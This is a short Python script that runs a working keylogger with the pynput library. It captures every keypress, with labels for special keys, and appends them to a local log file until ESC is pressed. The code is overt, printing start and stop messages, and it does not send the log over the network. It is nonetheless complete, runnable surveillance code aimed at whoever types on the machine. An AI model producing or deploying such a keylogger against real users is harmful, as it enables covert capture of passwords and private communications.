from pynput import keyboard

LOG_FILE = "keylog_output.txt"

def write_to_log(text):
   
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    try:
       
        if hasattr(key, 'char') and key.char is not None:
            write_to_log(key.char)
        else:
        
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT]",
                keyboard.Key.esc: "[ESC]"
            }
            if key in special_keys:
                write_to_log(special_keys[key])
            else:
                write_to_log(f"[{key}]")
    except Exception as e:
        write_to_log(f"[ERROR: {e}]")

def on_release(key):
    
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

def start_logger():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")

if __name__ == "__main__":
    start_logger()
